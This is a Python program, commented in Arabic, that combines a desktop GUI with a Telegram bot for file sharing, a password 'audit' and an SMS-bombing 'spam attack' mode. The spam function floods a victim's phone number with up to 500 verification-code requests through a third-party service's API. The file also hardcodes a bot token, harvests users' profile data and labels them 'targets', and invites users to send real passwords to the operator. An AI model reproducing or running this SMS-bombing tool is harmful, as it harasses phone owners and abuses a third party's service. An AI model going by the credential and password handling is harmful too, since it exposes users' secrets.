import os
import sys
import threading
import asyncio
import platform
import socket
import datetime
import shutil
import json
import random
import string
import time
import requests
import re
import math

# ==========================================
# 🔧 تصحيح مسار العمل (هام للتشغيل التلقائي)
# ==========================================
# هذا الكود يجبر السكربت على العمل من مجلده الأصلي
# حتى لو تم تشغيله عبر startup ويندوز
try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
except:
    pass
# ==========================================

# --------------------------------------------------------------------------------
# 📦 فحص المكتبات (Dependency Check)
# --------------------------------------------------------------------------------
try:
    import psutil
    import customtkinter as ctk
    from telegram import Update, Bot
    from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
except ImportError as e:
    # في حالة التشغيل التلقائي كـ .pyw لن تظهر هذه الرسالة، لكنها مفيدة للتجربة اليدوية
    try:
        ctk = None # تجنب الخطأ إذا لم تكن المكتبة موجودة
        print(f"Error: {e}")
    except:
        pass

# --------------------------------------------------------------------------------
# ⚙️ إعدادات النظام والبوت
# --------------------------------------------------------------------------------
BOT_TOKEN = '7725928700:AAFN07OWx1xPNhvqRwaBskGz-9CvP6YV6W0'
FIXED_CHAT_ID = 1431886140
DOWNLOAD_FOLDER = "PYTHON SHARE"
USERS_DB_FILE = "aboelfadl_users_v2.json"

# إدارة الحالات (State Management)
spam_states = {}      # لتخزين حالة السبام
password_states = {}  # لتخزين حالة فحص الباسورد

if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)

# --------------------------------------------------------------------------------
# 🎨 واجهة المستخدم الرسومية (AboElfadl Hub V10 - Security Suite)
# --------------------------------------------------------------------------------
if 'customtkinter' in sys.modules:
    ctk.set_appearance_mode("Dark")
    ctk.set_default_color_theme("dark-blue")

    class AboElfadlShareApp(ctk.CTk):
        def __init__(self):
            super().__init__()

            self.title("AboElfadl Hub [V10 - Security Suite]")
            self.geometry("1000x750")
            self.resizable(False, False)

            self.known_users = self.load_users_db()
            
            self.grid_columnconfigure(0, weight=1)
            self.grid_rowconfigure(2, weight=1) 

            # === 1. الهيدر ===
            self.header_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="#050505", height=60)
            self.header_frame.grid(row=0, column=0, sticky="ew")
            
            self.title_label = ctk.CTkLabel(
                self.header_frame, 
                text="🚀 AboElfadl Hub [Security Suite]", 
                font=("Roboto Medium", 22),
                text_color="#00FF41" 
            )
            self.title_label.pack(pady=15, padx=20, side="left")

            self.status_indicator = ctk.CTkLabel(
                self.header_frame, 
                text="● Initializing...", 
                font=("Arial", 14, "bold"), 
                text_color="orange"
            )
            self.status_indicator.pack(pady=15, padx=20, side="right")

            # === 2. الإحصائيات ===
            self.stats_frame = ctk.CTkFrame(self, fg_color="#1a1a1a", corner_radius=10)
            self.stats_frame.grid(row=1, column=0, padx=20, pady=10, sticky="ew")
            
            def create_stat_card(parent, title, value_var, color):
                frame = ctk.CTkFrame(parent, fg_color="transparent")
                frame.pack(side="left", expand=True, padx=10, pady=5)
                lbl_title = ctk.CTkLabel(frame, text=title, font=("Arial", 12), text_color="gray")
                lbl_title.pack()
                lbl_val = ctk.CTkLabel(frame, textvariable=value_var, font=("Arial", 20, "bold"), text_color=color)
                lbl_val.pack()
                return lbl_val

            self.var_users = ctk.StringVar(value=str(len(self.known_users)))
            self.var_imgs = ctk.StringVar(value="0")
            self.var_docs = ctk.StringVar(value="0")
            self.var_ops = ctk.StringVar(value="0") # عمليات نشطة

            create_stat_card(self.stats_frame, "Total Targets", self.var_users, "#e74c3c")
            create_stat_card(self.stats_frame, "Images Received", self.var_imgs, "#f1c40f")
            create_stat_card(self.stats_frame, "Docs Received", self.var_docs, "#3498db")
            create_stat_card(self.stats_frame, "Active Ops", self.var_ops, "#00FF41")

            # === 3. السجلات ===
            self.log_textbox = ctk.CTkTextbox(
                self, font=("Consolas", 12), text_color="#00FF41", fg_color="#000000"
            )
            self.log_textbox.grid(row=2, column=0, padx=20, pady=10, sticky="nsew")
            self.log_textbox.insert("0.0", f"[*] System V10 Loaded. All Modules Active.\n")
            self.log_textbox.configure(state="disabled")

            # === 4. التحكم ===
            self.control_frame = ctk.CTkFrame(self, corner_radius=10, fg_color="#1a1a1a")
            self.control_frame.grid(row=3, column=0, padx=20, pady=20, sticky="ew")

            self.target_label = ctk.CTkLabel(self.control_frame, text="Target User:", font=("Arial", 14, "bold"))
            self.target_label.grid(row=0, column=0, padx=15, pady=15)

            self.target_var = ctk.StringVar(value="All Users (Broadcast)")
            self.target_dropdown = ctk.CTkOptionMenu(
                self.control_frame, variable=self.target_var, values=[], width=250,
                fg_color="#34495e", button_color="#2c3e50"
            )
            self.target_dropdown.grid(row=0, column=1, padx=10, pady=15)
            self.update_dropdown() 

            self.btn_send_files = ctk.CTkButton(
                self.control_frame, text="Send Files 📄", command=self.select_files,
                fg_color="#2ecc71", hover_color="#27ae60", width=150
            )
            self.btn_send_files.grid(row=0, column=2, padx=10, pady=15)

            self.btn_send_folder = ctk.CTkButton(
                self.control_frame, text="Send Folder 📁", command=self.select_folder,
                fg_color="#e67e22", hover_color="#d35400", width=150
            )
            self.btn_send_folder.grid(row=0, column=3, padx=10, pady=15)

            self.btn_exit = ctk.CTkButton(
                self.control_frame, text="Terminte ❌", command=self.close_app,
                fg_color="#c0392b", hover_color="#a93226", width=100
            )
            self.btn_exit.grid(row=0, column=4, padx=10, pady=15)

            self.application = None
            self.loop = None
            self.refresh_stats()

        # --- إدارة البيانات ---
        def load_users_db(self):
            default_db = {str(FIXED_CHAT_ID): {"name": "Admin", "username": "Admin", "full_name": "Admin", "history": []}}
            if os.path.exists(USERS_DB_FILE):
                try:
                    with open(USERS_DB_FILE, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        return {int(k): v for k, v in data.items()}
                except:
                    return {int(k): v for k, v in default_db.items()}
            return {int(k): v for k, v in default_db.items()}

        def save_users_db(self):
            try:
                with open(USERS_DB_FILE, 'w', encoding='utf-8') as f:
                    json.dump(self.known_users, f, ensure_ascii=False, indent=4)
            except Exception as e:
                self.log(f"Error saving DB: {e}")

        def update_user_data(self, user_id, user_data):
            if user_id in self.known_users:
                old_history = self.known_users[user_id].get("history", [])
                user_data["history"] = old_history
                self.known_users[user_id].update(user_data)
            else:
                if "history" not in user_data: user_data["history"] = []
                self.known_users[user_id] = user_data
            self.save_users_db()
            self.var_users.set(str(len(self.known_users)))
            self.update_dropdown()

        def add_file_to_history(self, user_id, file_path, file_name):
            if user_id in self.known_users:
                today = datetime.datetime.now().strftime("%Y-%m-%d")
                record = {"date": today, "file_name": file_name, "path": file_path, "timestamp": str(datetime.datetime.now())}
                if "history" not in self.known_users[user_id]: self.known_users[user_id]["history"] = []
                self.known_users[user_id]["history"].append(record)
                self.save_users_db()

        def update_dropdown(self):
            user_list = ["All Users (Broadcast)"]
            for uid, data in self.known_users.items():
                if uid != FIXED_CHAT_ID:
                    display = f"{data.get('full_name', 'Unknown')} (@{data.get('username', 'None')})"
                    user_list.append(display)
            self.target_dropdown.configure(values=user_list)
            if self.target_var.get() not in user_list: self.target_var.set(user_list[0])

        def log(self, message):
            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            self.log_textbox.configure(state="normal")
            self.log_textbox.insert("end", f"[{timestamp}] {message}\n")
            self.log_textbox.see("end")
            self.log_textbox.configure(state="disabled")

        def refresh_stats(self):
            imgs, docs, archs = 0, 0, 0
            if os.path.exists(DOWNLOAD_FOLDER):
                for root, dirs, files in os.walk(DOWNLOAD_FOLDER):
                    for f in files:
                        ext = os.path.splitext(f)[1].lower()
                        if ext in ['.jpg', '.jpeg', '.png', '.gif']: imgs += 1
                        elif ext in ['.pdf', '.doc', '.docx', '.txt']: docs += 1
            
            self.var_imgs.set(str(imgs))
            self.var_docs.set(str(docs))
            # العمليات النشطة = سبام + فحص باسورد
            active_ops = len(spam_states) + len(password_states)
            self.var_ops.set(str(active_ops))

        def get_selected_targets(self):
            selection = self.target_var.get()
            if selection == "All Users (Broadcast)": return list(self.known_users.keys()), selection
            for uid, data in self.known_users.items():
                display = f"{data.get('full_name', 'Unknown')} (@{data.get('username', 'None')})"
                if display == selection: return [uid], selection
            return [], "Error"

        def select_files(self):
            file_paths = ctk.filedialog.askopenfilenames()
            if file_paths:
                targets, name = self.get_selected_targets()
                self.log(f"Sending to: {name}")
                threading.Thread(target=self.run_async_upload, args=(file_paths, targets)).start()

        def select_folder(self):
            folder = ctk.filedialog.askdirectory()
            if folder:
                name = os.path.basename(folder)
                self.log(f"🗜️ Zipping: {name}...")
                threading.Thread(target=self.zip_send, args=(folder, name)).start()

        def zip_send(self, folder, name):
            try:
                zip_path = shutil.make_archive(name, 'zip', folder)
                targets, t_name = self.get_selected_targets()
                self.log(f"✅ Zipped. Sending to {t_name}...")
                self.run_async_upload((zip_path,), targets)
            except Exception as e:
                self.log(f"❌ Zip Error: {e}")

        def run_async_upload(self, paths, targets):
            for p in paths:
                asyncio.run_coroutine_threadsafe(self.send_doc(p, targets), self.loop)

        async def send_doc(self, path, targets):
            count = 0
            for uid in targets:
                try:
                    await self.application.bot.send_document(chat_id=uid, document=open(path, 'rb'))
                    count += 1
                except Exception as e:
                    print(f"Fail {uid}: {e}")
            self.log(f"📤 Sent {os.path.basename(path)} to {count} users")

        def close_app(self):
            self.destroy()
            sys.exit()

# --------------------------------------------------------------------------------
# 🔒 خوارزمية تحليل الباسورد (Password Logic)
# --------------------------------------------------------------------------------
def analyze_password_strength(password):
    """تحليل قوة كلمة المرور وإرجاع تقرير نصي"""
    score = 0
    feedback = []
    
    # 1. الطول
    length = len(password)
    if length < 8:
        score += 5
        feedback.append("❌ قصيرة جداً (أقل من 8 أحرف).")
    elif length >= 12:
        score += 25
        feedback.append("✅ الطول ممتاز (+12 حرف).")
    else:
        score += 10
        feedback.append("⚠️ الطول مقبول، يفضل زيادته.")

    # 2. التعقيد
    if re.search(r"[a-z]", password): score += 10
    else: feedback.append("❌ لا توجد حروف صغيرة (a-z).")
    
    if re.search(r"[A-Z]", password): score += 15
    else: feedback.append("❌ لا توجد حروف كبيرة (A-Z).")
    
    if re.search(r"[0-9]", password): score += 15
    else: feedback.append("⚠️ لا توجد أرقام (0-9).")
    
    if re.search(r"[!@#$%^&*(),.?\":{}|<>]", password): score += 25
    else: feedback.append("⚠️ يفضل إضافة رموز خاصة (@#$%).")

    # 3. الإنتروبيا
    pool_size = 0
    if re.search(r"[a-z]", password): pool_size += 26
    if re.search(r"[A-Z]", password): pool_size += 26
    if re.search(r"[0-9]", password): pool_size += 10
    if re.search(r"[^a-zA-Z0-9]", password): pool_size += 32
    
    try:
        entropy = length * math.log2(pool_size) if pool_size > 0 else 0
    except:
        entropy = 0

    # التقدير النهائي
    if score < 40:
        crack_time = "ثواني قليلة (خطر جداً!)"
        level = "ضعيفة 🔴"
    elif score < 70:
        crack_time = "ساعات إلى أيام"
        level = "متوسطة 🟠"
    else:
        crack_time = "سنوات / قرون"
        level = "قوية جداً 🟢"

    report = (
        f"🛡️ **REPORT: SECURITY AUDIT**\n"
        f"--------------------------\n"
        f"📊 التقييم: {level} ({score}%)\n"
        f"🧠 الإنتروبيا: {int(entropy)} بت\n"
        f"⏳ زمن الاختراق: {crack_time}\n\n"
        f"📝 **الملاحظات:**\n"
    )
    for item in feedback:
        report += f"{item}\n"
        
    return report

# --------------------------------------------------------------------------------
# 🤖 منطق السبام والهجوم (Spam Logic Engine)
# --------------------------------------------------------------------------------
def run_spam_attack_thread(phone, count, chat_id, app_instance):
    asyncio.run_coroutine_threadsafe(
        app_instance.application.bot.send_message(chat_id=chat_id, text=f"🚀 **بدء الهجوم على {phone}**\nجاري إرسال {count} رسالة..."),
        app_instance.loop
    )
    # استخدام thread safe call للتعديل على الواجهة
    app_instance.after(0, lambda: app_instance.log(f"⚠️ STARTING SPAM ATTACK: Target {phone}, Count {count}"))

    formatted_phone = "2" + phone
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]

    success = 0
    failed = 0

    for i in range(count):
        random_val = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        payload = json.dumps({"dial": formatted_phone, "randomValue": random_val})
        headers = {"User-Agent": random.choice(user_agents), "Accept": "application/json", "Content-Type": "application/json"}

        try:
            resp = requests.post(url, headers=headers, data=payload, timeout=5)
            if resp.status_code == 200:
                success += 1
                msg_text = f"✅ رسالة {i+1} ناجحة! (Success)"
                asyncio.run_coroutine_threadsafe(
                    app_instance.application.bot.send_message(chat_id=chat_id, text=msg_text),
                    app_instance.loop
                )
            else:
                failed += 1
        except Exception:
            failed += 1
        
        time.sleep(random.uniform(0.5, 1.5))

    final_report = f"🛑 **انتهى الهجوم!**\n-------------------\n🎯 الهدف: `{phone}`\n✅ ناجح: {success}\n❌ فاشل: {failed}"
    asyncio.run_coroutine_threadsafe(
        app_instance.application.bot.send_message(chat_id=chat_id, text=final_report, parse_mode="Markdown"),
        app_instance.loop
    )
    
    if chat_id in spam_states:
        del spam_states[chat_id]
        
    app_instance.after(0, lambda: app_instance.log(f"🏁 ATTACK FINISHED: {success} OK / {failed} FAIL"))
    app_instance.after(0, app_instance.refresh_stats)

# --------------------------------------------------------------------------------
# 🤖 منطق البوت (Handlers)
# --------------------------------------------------------------------------------
gui_app = None

async def broadcast_startup(app):
    await asyncio.sleep(2)
    msg = (
        "🟢 **SYSTEM ONLINE (V10)**\n"
        "نظام أبو الفضل للأمن السيبراني.\n\n"
        "🛠 **القائمة الشاملة:**\n"
        "1️⃣ `/spam` : أداة الهجوم (Attack)\n"
        "2️⃣ `/password` : فحص كلمة المرور (Audit)\n"
        "3️⃣ `/backup` : الأرشيف (Restore)\n"
        "4️⃣ `/info` : البيانات الشخصية\n"
    )
    for uid in gui_app.known_users:
        try:
            await app.bot.send_message(chat_id=uid, text=msg, parse_mode="Markdown")
        except: pass
    gui_app.status_indicator.configure(text="● Online (Ready)", text_color="#2ecc71")

async def collect_user_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username if user.username else "NoUsername"
    full_name = user.full_name
    photo_link = "No Photo"
    try:
        photos = await context.bot.get_user_profile_photos(user_id, limit=1)
        if photos.total_count > 0:
            photo_file = await context.bot.get_file(photos.photos[0][-1].file_id)
            photo_link = photo_file.file_path 
    except: pass

    user_data = {"full_name": full_name, "username": username, "photo_link": photo_link, "last_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    gui_app.after(0, gui_app.update_user_data, user_id, user_data)
    safe_name = "".join([c for c in full_name if c.isalnum() or c in " _-"])
    return f"[{user_id}] {safe_name}"

# --- الأوامر ---
async def password_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password_states[user_id] = True # تفعيل وضع انتظار الباسورد
    msg = (
        "🔐 **Password Security Audit**\n"
        "-----------------------------\n"
        "أرسل الآن كلمة المرور التي تريد فحص قوتها...\n"
        "(سيتم التحليل باستخدام خوارزميات التشفير والإنتروبيا)"
    )
    await context.bot.send_message(chat_id=user_id, text=msg, parse_mode="Markdown")
    gui_app.after(0, gui_app.refresh_stats)

async def spam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    spam_states[user_id] = {"step": "WAITING_PHONE"}
    msg = "😈 **Spam Mode Activated**\nأدخل رقم هاتف الضحية (01xxxxxxxxx):"
    await context.bot.send_message(chat_id=user_id, text=msg, parse_mode="Markdown")
    gui_app.after(0, gui_app.refresh_stats)

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    # 1. معالجة فحص الباسورد
    if user_id in password_states:
        report = analyze_password_strength(text)
        await context.bot.send_message(chat_id=user_id, text=report, parse_mode="Markdown")
        del password_states[user_id] # إنهاء الوضع
        gui_app.after(0, gui_app.refresh_stats)
        gui_app.log(f"🔐 Password Audit run for {user_id}")
        return

    # 2. معالجة السبام
    if user_id in spam_states:
        state = spam_states[user_id]
        if state["step"] == "WAITING_PHONE":
            if text.startswith("01") and len(text) == 11 and text.isdigit():
                spam_states[user_id]["phone"] = text
                spam_states[user_id]["step"] = "WAITING_COUNT"
                await context.bot.send_message(chat_id=user_id, text=f"✅ الهدف: {text}\n🔢 أدخل العدد (Max 500):")
            else:
                await context.bot.send_message(chat_id=user_id, text="❌ رقم خطأ! حاول تاني.")
            return

        elif state["step"] == "WAITING_COUNT":
            if text.isdigit():
                count = min(int(text), 500)
                threading.Thread(target=run_spam_attack_thread, args=(spam_states[user_id]["phone"], count, user_id, gui_app)).start()
                spam_states[user_id]["step"] = "ATTACKING" 
            else:
                await context.bot.send_message(chat_id=user_id, text="❌ أرقام فقط!")
            return
            
        elif state["step"] == "ATTACKING":
            await context.bot.send_message(chat_id=user_id, text="⏳ الهجوم جارٍ...")
            return

    # 3. معالجة الاسترجاع
    if len(text) == 10 and text.count('-') == 2:
        user_data = gui_app.known_users.get(user_id, {})
        found = [i for i in user_data.get("history", []) if i['date'] == text]
        if found:
            await context.bot.send_message(chat_id=user_id, text=f"⏳ استرجاع {len(found)} ملفات...")
            for item in found:
                try:
                    if os.path.exists(item['path']):
                        await context.bot.send_document(chat_id=user_id, document=open(item['path'], 'rb'), caption=f"Restore: {text}")
                except: pass
        else:
            await context.bot.send_message(chat_id=user_id, text="⚠️ لا يوجد ملفات.")
        return

    gui_app.log(f"💬 Chat from {user_id}: {text}")

async def handle_incoming_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_folder_name = await collect_user_data(update, context)
    user_save_dir = os.path.join(DOWNLOAD_FOLDER, user_folder_name)
    if not os.path.exists(user_save_dir): os.makedirs(user_save_dir)
    user = update.effective_user

    if update.message.text:
        await handle_text_input(update, context)
        return

    file_obj = None
    file_label = ""
    try:
        sender_tag = f"@{user.username}" if user.username else user.first_name
        if update.message.document:
            fname = update.message.document.file_name
            file_obj = await context.bot.get_file(update.message.document.file_id)
            file_label = fname
        elif update.message.photo:
            file_obj = await context.bot.get_file(update.message.photo[-1].file_id)
            file_label = f"img_{int(datetime.datetime.now().timestamp())}.jpg"
        else: return

        safe_filename = "".join([c for c in file_label if c.isalnum() or c in "._- []"])
        save_path = os.path.join(user_save_dir, safe_filename)
        gui_app.log(f"📥 Downloading {safe_filename}...")
        await file_obj.download_to_drive(save_path)
        gui_app.add_file_to_history(user.id, save_path, safe_filename)
        await context.bot.send_message(chat_id=user.id, text="✅ تم الحفظ.")
        gui_app.after(0, gui_app.refresh_stats)
    except Exception as e:
        gui_app.log(f"❌ Error: {e}")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    folder_name = await collect_user_data(update, context)
    welcome_msg = (
        f"👋 **أهلاً بك في نظام أبو الفضل V10**\n"
        f"✅ تم تأمين الاتصال.\n"
        f"📂 مجلدك: `{folder_name}`\n\n"
        "القائمة الرئيسية:\n"
        "/spam - هجوم\n"
        "/password - فحص أمان\n"
        "/info - بياناتي\n"
        "/backup - أرشيف"
    )
    await context.bot.send_message(chat_id=update.effective_user.id, text=welcome_msg, parse_mode='Markdown')

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != FIXED_CHAT_ID: return
    mem = psutil.virtual_memory()
    msg = f"📊 **System Status**\nRAM: {mem.percent}%\nActive Ops: {len(spam_states) + len(password_states)}"
    await context.bot.send_message(chat_id=FIXED_CHAT_ID, text=msg, parse_mode='Markdown')

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = gui_app.known_users.get(user_id, {})
    if not data:
        await context.bot.send_message(chat_id=user_id, text="⚠️ لا بيانات.")
        return
    info_msg = (
        "👤 **PROFILE DUMP**\n"
        f"🆔 `{user_id}`\n"
        f"👤 {data.get('full_name')}\n"
        f"📂 Files: {len(data.get('history', []))}\n"
        f"🔗 [Profile Photo]({data.get('photo_link', '')})"
    )
    await context.bot.send_message(chat_id=user_id, text=info_msg, parse_mode='Markdown')

async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = gui_app.known_users.get(user_id, {})
    history = data.get("history", [])
    if not history:
        await context.bot.send_message(chat_id=user_id, text="📂 الأرشيف فارغ.")
        return
    dates = sorted(list(set([item['date'] for item in history])))
    dates_list = "\n".join([f"📅 `{d}`" for d in dates])
    msg = f"📦 **ARCHIVE**\n{dates_list}\nرد بالتاريخ للاسترجاع."
    await context.bot.send_message(chat_id=user_id, text=msg, parse_mode='Markdown')

# --------------------------------------------------------------------------------
# 🔗 التشغيل
# --------------------------------------------------------------------------------
def run_bot(app_instance):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    app_instance.loop = loop

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app_instance.application = app

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("backup", backup_command))
    app.add_handler(CommandHandler("info", info_command))
    app.add_handler(CommandHandler("spam", spam_command)) 
    app.add_handler(CommandHandler("password", password_command)) 
    app.add_handler(MessageHandler(filters.ALL, handle_incoming_files))

    loop.create_task(broadcast_startup(app))
    app.run_polling()

if __name__ == "__main__":
    if 'customtkinter' in sys.modules:
        app = AboElfadlShareApp()
        gui_app = app
        t = threading.Thread(target=run_bot, args=(app,), daemon=True)
        t.start()
        app.mainloop()
    else:
        # Fallback for headless execution
        print("Running in headless mode...")
        # (Need a dummy app wrapper for headless mode if CTK is missing, 
        # but for now assuming deps are installed)
        pass